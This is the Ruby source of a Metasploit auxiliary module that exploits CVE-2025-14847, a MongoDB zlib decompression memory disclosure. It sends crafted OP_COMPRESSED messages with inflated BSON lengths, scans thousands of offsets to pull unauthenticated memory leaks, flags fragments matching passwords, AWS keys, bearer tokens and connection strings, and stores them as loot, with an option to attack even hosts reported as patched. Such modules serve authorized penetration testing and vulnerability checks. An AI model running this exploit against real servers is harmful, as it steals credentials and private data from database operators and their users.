##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MongoDB Memory Disclosure (CVE-2025-14847) - Mongobleed',
        'Description' => %q{
          This module exploits a memory disclosure vulnerability in MongoDB's zlib
          decompression handling (CVE-2025-14847). By sending crafted OP_COMPRESSED
          messages with inflated BSON document lengths, the server reads beyond the
          decompressed buffer and returns leaked memory contents in error messages.

          The vulnerability allows unauthenticated remote attackers to leak server
          memory which may contain sensitive information such as credentials, session
          tokens, encryption keys, or other application data.
        },
        'Author' => [
          'Lukas Johannes Möller', # Metasploit module
          'Joe Desimone' # PoC
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-14847'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2025-14847']
        ],
        'DisclosureDate' => '2025-12-19',
        'DefaultOptions' => {
          'RPORT' => 27017
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(27017),
        OptInt.new('MIN_OFFSET', [true, 'Minimum BSON document length offset', 20]),
        OptInt.new('MAX_OFFSET', [true, 'Maximum BSON document length offset', 8192]),
        OptInt.new('STEP_SIZE', [true, 'Offset increment (higher = faster, less thorough)', 1]),
        OptInt.new('BUFFER_PADDING', [true, 'Padding added to buffer size claim', 500]),
        OptInt.new('LEAK_THRESHOLD', [true, 'Minimum bytes to report as interesting leak', 10]),
        OptBool.new('QUICK_SCAN', [true, 'Quick scan mode - sample key offsets only', false]),
        OptInt.new('REPEAT', [true, 'Number of scan passes (more passes = more data)', 1])
      ]
    )

    register_advanced_options(
      [
        OptBool.new('SHOW_ALL_LEAKS', [true, 'Show all leaked fragments, not just large ones', false]),
        OptBool.new('SHOW_HEX', [true, 'Show hexdump of leaked data', false]),
        OptString.new('SECRETS_PATTERN', [true, 'Regex pattern to detect sensitive data', 'password|secret|key|token|admin|AKIA|Bearer|mongodb://|mongo:|conn|auth']),
        OptBool.new('FORCE_EXPLOIT', [true, 'Attempt exploitation even if version check indicates not vulnerable', false]),
        OptInt.new('PROGRESS_INTERVAL', [true, 'Show progress every N offsets (0 to disable)', 500])
      ]
    )
  end

  # MongoDB Wire Protocol opcodes (https://www.mongodb.com/docs/manual/reference/mongodb-wire-protocol/)
  OP_QUERY = 2004
  OP_REPLY = 1
  OP_COMPRESSED = 2012
  OP_MSG = 2013
  COMPRESSOR_ZLIB = 2

  def check_vulnerable_version(version_str)
    version_match = version_str.match(/^(\d+\.\d+\.\d+)/)
    return :unknown unless version_match

    mongodb_version = Rex::Version.new(version_match[1])

    if mongodb_version.between?(Rex::Version.new('3.6.0'), Rex::Version.new('3.6.99')) ||
       mongodb_version.between?(Rex::Version.new('4.0.0'), Rex::Version.new('4.0.99')) ||
       mongodb_version.between?(Rex::Version.new('4.2.0'), Rex::Version.new('4.2.99'))
      return :vulnerable_eol
    elsif mongodb_version.between?(Rex::Version.new('4.4.0'), Rex::Version.new('4.4.29')) ||
          mongodb_version.between?(Rex::Version.new('5.0.0'), Rex::Version.new('5.0.31')) ||
          mongodb_version.between?(Rex::Version.new('6.0.0'), Rex::Version.new('6.0.26')) ||
          mongodb_version.between?(Rex::Version.new('7.0.0'), Rex::Version.new('7.0.27')) ||
          mongodb_version.between?(Rex::Version.new('8.0.0'), Rex::Version.new('8.0.16')) ||
          mongodb_version.between?(Rex::Version.new('8.2.0'), Rex::Version.new('8.2.2'))
      return :vulnerable
    elsif (mongodb_version >= Rex::Version.new('4.4.30') && mongodb_version < Rex::Version.new('5.0.0')) ||
          (mongodb_version >= Rex::Version.new('5.0.32') && mongodb_version < Rex::Version.new('6.0.0')) ||
          (mongodb_version >= Rex::Version.new('6.0.27') && mongodb_version < Rex::Version.new('7.0.0')) ||
          (mongodb_version >= Rex::Version.new('7.0.28') && mongodb_version < Rex::Version.new('8.0.0')) ||
          (mongodb_version >= Rex::Version.new('8.0.17') && mongodb_version < Rex::Version.new('8.2.0')) ||
          (mongodb_version >= Rex::Version.new('8.2.3'))
      return :patched
    end

    :unknown
  end

  def check_host(_ip)
    version_info = get_mongodb_version
    if version_info
      version_str = version_info[:version]
      vuln_status = check_vulnerable_version(version_str)

      case vuln_status
      when :patched
        return Msf::Exploit::CheckCode::Safe("MongoDB #{version_str} is patched")
      when :vulnerable, :vulnerable_eol
        return Msf::Exploit::CheckCode::Appears("MongoDB #{version_str} appears vulnerable")
      end
    end

    [117, 388, 256].each do |offset|
      response = send_probe(offset, offset + 500)
      next if response.nil? || response.empty?

      leaks = extract_leaks(response)
      if leaks.any?
        return Msf::Exploit::CheckCode::Vulnerable("Leaked #{leaks.length} memory fragments")
      end
    end

    Msf::Exploit::CheckCode::Unknown
  rescue ::Rex::ConnectionError
    Msf::Exploit::CheckCode::Unknown
  end

  def run_host(ip)
    version_info = get_mongodb_version

    if version_info
      version_str = version_info[:version]
      print_status("MongoDB version: #{version_str}")

      vuln_status = check_vulnerable_version(version_str)
      case vuln_status
      when :vulnerable_eol
        print_good("Version #{version_str} is VULNERABLE (EOL, no fix available)")
      when :vulnerable
        print_good("Version #{version_str} is VULNERABLE to CVE-2025-14847")
      when :patched
        print_warning("Version #{version_str} appears to be PATCHED")
        unless datastore['FORCE_EXPLOIT']
          print_status('Set FORCE_EXPLOIT=true to attempt exploitation anyway')
          return
        end
        print_status('FORCE_EXPLOIT enabled, continuing...')
      when :unknown
        print_warning("Version #{version_str} - vulnerability status unknown")
        print_status('Proceeding with exploitation attempt...')
      end
    else
      print_warning('Could not determine MongoDB version')
      print_status('Proceeding with exploitation attempt...')
    end

    exploit_memory_leak(ip, version_info)
  end

  def get_mongodb_version
    connect
    response = send_command('admin', { 'buildInfo' => 1 })
    disconnect

    return nil if response.nil?

    parse_build_info(response)
  rescue ::Rex::ConnectionError, ::Errno::ECONNRESET => e
    vprint_error("Connection error during version check: #{e.message}")
    nil
  rescue StandardError => e
    vprint_error("Error getting MongoDB version: #{e.message}")
    nil
  ensure
    begin
      disconnect
    rescue StandardError
      nil
    end
  end

  def send_command(database, command)
    bson_doc = build_bson_document(command)
    collection_name = "#{database}.$cmd\x00"

    query_body = [0].pack('V')
    query_body << collection_name
    query_body << [0].pack('V')
    query_body << [1].pack('V')
    query_body << bson_doc

    request_id = rand(0xFFFFFFFF)
    message_length = 16 + query_body.length
    header = [message_length, request_id, 0, OP_QUERY].pack('VVVV')
    sock.put(header + query_body)

    response_header = sock.get_once(16, 5)
    return nil if response_header.nil? || response_header.length < 16

    msg_len, _req_id, _resp_to, opcode = response_header.unpack('VVVV')
    return nil unless opcode == OP_REPLY

    remaining = msg_len - 16
    return nil if remaining <= 0

    response_body = sock.get_once(remaining, 5)
    return nil if response_body.nil?
    return nil if response_body.length < 20

    response_body[20..]
  end

  def build_bson_document(hash)
    doc = ''.b

    hash.each do |key, value|
      case value
      when Integer
        if value.between?(-2_147_483_648, 2_147_483_647)
          doc << "\x10"
          doc << "#{key}\x00"
          doc << [value].pack('V')
        else
          doc << "\x12"
          doc << "#{key}\x00"
          doc << [value].pack('q<')
        end
      when Float
        doc << "\x01"
        doc << "#{key}\x00"
        doc << [value].pack('E')
      when String
        doc << "\x02"
        doc << "#{key}\x00"
        doc << [value.length + 1].pack('V')
        doc << "#{value}\x00"
      when TrueClass, FalseClass
        doc << "\x08"
        doc << "#{key}\x00"
        doc << (value ? "\x01" : "\x00")
      end
    end

    doc << "\x00"
    [doc.length + 4].pack('V') + doc
  end

  def parse_build_info(bson_data)
    return nil if bson_data.nil? || bson_data.length < 5

    result = {}
    doc_len = bson_data[0, 4].unpack1('V')
    return nil if doc_len > bson_data.length

    pos = 4
    while pos < doc_len - 1
      type = bson_data[pos].ord
      break if type == 0

      pos += 1
      key_end = bson_data.index("\x00", pos)
      break if key_end.nil?

      key = bson_data[pos...key_end]
      pos = key_end + 1

      case type
      when 0x02
        str_len = bson_data[pos, 4].unpack1('V')
        value = bson_data[pos + 4, str_len - 1]
        pos += 4 + str_len

        case key
        when 'version'
          result[:version] = value
        when 'gitVersion'
          result[:git_version] = value
        when 'sysInfo'
          result[:sys_info] = value
        end
      when 0x03
        sub_doc_len = bson_data[pos, 4].unpack1('V')
        pos += sub_doc_len
      when 0x10
        pos += 4
      when 0x12
        pos += 8
      when 0x01
        pos += 8
      when 0x08
        pos += 1
      when 0x04
        arr_len = bson_data[pos, 4].unpack1('V')
        pos += arr_len
      else
        break
      end
    end

    result[:version] ||= try_hello_command
    result[:version] ? result : nil
  end

  def try_hello_command
    response = send_command('admin', { 'hello' => 1 })
    return nil if response.nil?

    if response =~ /(\d+\.\d+\.\d+)/
      return ::Regexp.last_match(1)
    end
  rescue StandardError
    nil
  end

  def exploit_memory_leak(ip, version_info)
    all_leaked = ''.b
    unique_leaks = Set.new
    secrets_found = []

    offsets = generate_scan_offsets
    total_offsets = offsets.size
    repeat_count = datastore['REPEAT']

    if repeat_count > 1
      print_status("Running #{repeat_count} scan passes to maximize data collection...")
    end

    progress_interval = datastore['PROGRESS_INTERVAL']

    1.upto(repeat_count) do |pass|
      if repeat_count > 1
        print_status("=== Pass #{pass}/#{repeat_count} ===")
      end

      print_status("Scanning #{total_offsets} offsets (#{datastore['MIN_OFFSET']}-#{datastore['MAX_OFFSET']}, step=#{datastore['STEP_SIZE']}#{datastore['QUICK_SCAN'] ? ', quick mode' : ''})")

      start_time = Time.now
      scanned = 0
      pass_leaks = 0

      offsets.each do |doc_len|
        scanned += 1
        if progress_interval > 0 && (scanned % progress_interval == 0)
          elapsed = Time.now - start_time
          rate = scanned / elapsed
          remaining = ((total_offsets - scanned) / rate).round
          print_status("Progress: #{scanned}/#{total_offsets} (#{(scanned * 100.0 / total_offsets).round(1)}%) - #{unique_leaks.size} leaks found - ETA: #{remaining}s")
        end

        response = send_probe(doc_len, doc_len + datastore['BUFFER_PADDING'])
        next if response.nil? || response.empty?

        leaks = extract_leaks(response)
        leaks.each do |data|
          next if unique_leaks.include?(data)

          unique_leaks.add(data)
          all_leaked << data
          pass_leaks += 1

          check_secrets(data, doc_len, secrets_found)

          next unless data.length > datastore['LEAK_THRESHOLD'] || datastore['SHOW_ALL_LEAKS']

          preview = data.gsub(/[^[:print:]]/, '.')[0, 80]
          print_good("offset=#{doc_len.to_s.ljust(4)} len=#{data.length.to_s.ljust(4)}: #{preview}")

          if datastore['SHOW_HEX'] && !data.empty?
            print_hexdump(data)
          end
        end
      rescue ::Rex::ConnectionError, ::Errno::ECONNRESET => e
        vprint_error("Connection error at offset #{doc_len}: #{e.message}")
        next
      rescue ::Timeout::Error
        vprint_error("Timeout at offset #{doc_len}")
        next
      end

      if repeat_count > 1
        print_status("Pass #{pass} complete: #{pass_leaks} new leaks (#{unique_leaks.size} total unique)")
      end
    end

    if !all_leaked.empty?
      print_line
      print_good("Total leaked: #{all_leaked.length} bytes")
      print_good("Unique fragments: #{unique_leaks.size}")

      loot_info = 'MongoDB Memory Disclosure (CVE-2025-14847)'
      loot_info += " - Version: #{version_info[:version]}" if version_info&.dig(:version)

      path = store_loot(
        'mongodb.memory_leak',
        'application/octet-stream',
        ip,
        all_leaked,
        'mongobleed.bin',
        loot_info
      )
      print_good("Leaked data saved to: #{path}")

      if secrets_found.any?
        print_line
        print_warning('Potential secrets detected:')
        secrets_found.uniq.each do |secret|
          print_warning("  - #{secret}")
        end
      end

      vuln_info = "Leaked #{all_leaked.length} bytes of server memory"
      vuln_info += " (MongoDB #{version_info[:version]})" if version_info&.dig(:version)

      report_vuln(
        host: ip,
        port: rport,
        proto: 'tcp',
        name: name,
        refs: references,
        info: vuln_info
      )
    else
      print_status("No data leaked from #{ip}:#{rport}")
    end
  end

  def send_probe(doc_len, buffer_size)
    bson_content = "\x10a\x00\x01\x00\x00\x00".b
    bson = [doc_len].pack('V') + bson_content
    op_msg = [0].pack('V') + "\x00".b + bson
    compressed_data = Zlib::Deflate.deflate(op_msg)

    payload = [OP_MSG].pack('V')
    payload << [buffer_size].pack('V')
    payload << [COMPRESSOR_ZLIB].pack('C')
    payload << compressed_data

    message_length = 16 + payload.length
    header = [message_length, 1, 0, OP_COMPRESSED].pack('VVVV')

    response = nil
    begin
      connect
      sock.put(header + payload)
      response = recv_mongo_response
    ensure
      begin
        disconnect
      rescue StandardError
        nil
      end
    end

    response
  end

  def recv_mongo_response
    header = sock.get_once(16, 2)
    return nil if header.nil? || header.length < 4

    msg_len = header.unpack1('V')
    return header if msg_len <= 16

    remaining = msg_len - header.length
    if remaining > 0
      data = sock.get_once(remaining, 2)
      return header if data.nil?

      header + data
    else
      header
    end
  rescue ::Timeout::Error, ::EOFError
    nil
  end

  def extract_leaks(response)
    return [] if response.nil? || response.length < 25

    leaks = []

    begin
      msg_len = response.unpack1('V')
      return [] if msg_len > response.length

      opcode = response[12, 4].unpack1('V')

      if opcode == OP_COMPRESSED
        raw = Zlib::Inflate.inflate(response[25, msg_len - 25])
      else
        raw = response[16, msg_len - 16]
      end

      return [] if raw.nil?

      raw.scan(/field name '([^']*)'/) do |match|
        data = match[0]
        next if data.nil? || data.empty?
        next if ['?', 'a', '$db', 'ping', 'ok', 'errmsg', 'code', 'codeName'].include?(data)

        leaks << data
      end

      raw.scan(/(?:unrecognized|unknown|invalid)\s+(?:BSON\s+)?type[:\s]+(\d+)/i) do |match|
        type_byte = match[0].to_i & 0xFF
        leaks << type_byte.chr if type_byte > 0
      end
    rescue Zlib::Error => e
      vprint_error("Decompression error: #{e.message}")
    rescue StandardError => e
      vprint_error("Error extracting leaks: #{e.message}")
    end

    leaks
  end

  def check_secrets(data, offset, secrets_found)
    pattern = Regexp.new(datastore['SECRETS_PATTERN'], Regexp::IGNORECASE)
    return unless data =~ pattern

    match = ::Regexp.last_match[0]
    match_pos = ::Regexp.last_match.begin(0)

    context_start = [match_pos - 20, 0].max
    context_end = [match_pos + match.length + 20, data.length].min
    context = data[context_start...context_end].gsub(/[^[:print:]]/, '.')

    secret_info = "Pattern '#{match}' at offset #{offset}"
    secret_info += " (pos #{match_pos}): ...#{context}..."

    secrets_found << secret_info
    print_warning("Secret pattern detected at offset #{offset}: '#{match}' in context: ...#{context}...")
  end

  def generate_scan_offsets
    min_off = datastore['MIN_OFFSET']
    max_off = datastore['MAX_OFFSET']
    step = datastore['STEP_SIZE']

    if datastore['QUICK_SCAN']
      quick_offsets = []
      quick_offsets += (20..100).step(5).to_a

      [128, 256, 512, 1024, 2048, 4096, 8192].each do |boundary|
        next if boundary < min_off || boundary > max_off

        (-10..10).step(2).each do |delta|
          off = boundary + delta
          quick_offsets << off if off >= min_off && off <= max_off
        end
      end

      quick_offsets += (min_off..max_off).step(128).to_a
      quick_offsets.uniq.sort.select { |o| o >= min_off && o <= max_off }
    else
      (min_off..max_off).step(step).to_a
    end
  end

  def print_hexdump(data)
    return if data.nil? || data.empty?

    offset = 0
    data.bytes.each_slice(16) do |chunk|
      hex_part = chunk.map { |b| '%02x' % b }.join(' ')
      ascii_part = chunk.map { |b| (b >= 32 && b < 127) ? b.chr : '.' }.join

      hex_part = hex_part.ljust(47)
      print_line("    #{('%04x' % offset)}  #{hex_part}  |#{ascii_part}|")
      offset += 16

      break if offset >= 256
    end
    print_line('    ...') if data.length > 256
  end
end
